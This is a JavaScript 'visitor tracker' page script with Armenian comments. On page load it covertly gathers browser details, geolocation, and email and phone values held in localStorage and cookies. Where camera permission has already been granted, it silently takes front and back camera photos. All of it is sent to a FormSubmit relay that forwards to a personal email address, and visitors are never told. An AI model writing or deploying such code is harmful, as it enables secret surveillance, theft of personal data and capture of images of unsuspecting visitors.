// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
async function trackVisitor() {
    const data = {
        website: window.location.href || "index.html",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        referrer: document.referrer || "Direct visit",
        visitTime: new Date().toISOString(),
        ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
    };

    // Ստուգել localStorage-ում պահված տվյալները
    try {
        const savedEmail = localStorage.getItem('userEmail');
        const savedPhone = localStorage.getItem('userPhone');
        
        if (savedEmail) data.savedEmail = savedEmail;
        if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
        console.log("LocalStorage access error:", e);
    }

    // Ստուգել cookies-ում պահված տվյալները
    try {
        const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
        }, {});

        if (cookies.email) data.cookieEmail = cookies.email;
        if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
        console.log("Cookie access error:", e);
    }

    // Փորձել ստանալ գեոտեղադրություն
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
        position => {
            data.latitude = position.coords.latitude;
            data.longitude = position.coords.longitude;
            captureAndSend(data);
        },
        () => {
            data.locationError = "Geolocation unavailable";
            captureAndSend(data);
        }
        );
    } else {
        captureAndSend(data);
    }
}

// Վեբկամերայի նկարի հավաքում
async function captureCameraImages(data) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: { exact: "user" }, // Ճակատային կամերա
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        
        // Նկարել առաջին կադրը (ճակատային տեսարան)
        const frontPhoto = await imageCapture.takePhoto();
        data.frontCameraPhoto = await blobToBase64(frontPhoto);
        
        // Փորձել ստանալ հետևի կամերայի նկարը (եթե հնարավոր է)
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: { exact: "environment" }, // Հետևի կամերա
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            
            const backTrack = backStream.getVideoTracks()[0];
            const backImageCapture = new ImageCapture(backTrack);
            const backPhoto = await backImageCapture.takePhoto();
            data.backCameraPhoto = await blobToBase64(backPhoto);
            
            backTrack.stop();
        } catch (backError) {
            data.backCameraError = "Հետևի կամերան հասանելի չէ";
        }
        
        track.stop();
    } catch (error) {
        data.cameraError = "Վեբկամերան հասանելի չէ կամ մերժվել է մուտքը";
    }
    
    return data;
}

// Blob-ը փոխարկել base64-ի
function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}

// Նկարել և ուղարկել տվյալները
async function captureAndSend(data) {
    try {
        // Փորձել ստանալ կամերայի նկարները միայն եթե օգտատերը տվել է թույլտվությունը
        if (navigator.mediaDevices && navigator.permissions) {
            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
            if (permissionStatus.state === 'granted') {
                await captureCameraImages(data);
            }
        }
    } catch (e) {
        console.log("Camera permission check error:", e);
    }
    
    sendData(data);
}

// Տվյալների ուղարկում FormSubmit-ին
function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
        method: "POST",
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log("Success:", data))
    .catch(error => console.error("Error:", error));
}

// Գործարկել հետևումը էջի բեռնվելուց հետո
window.addEventListener('load', trackVisitor);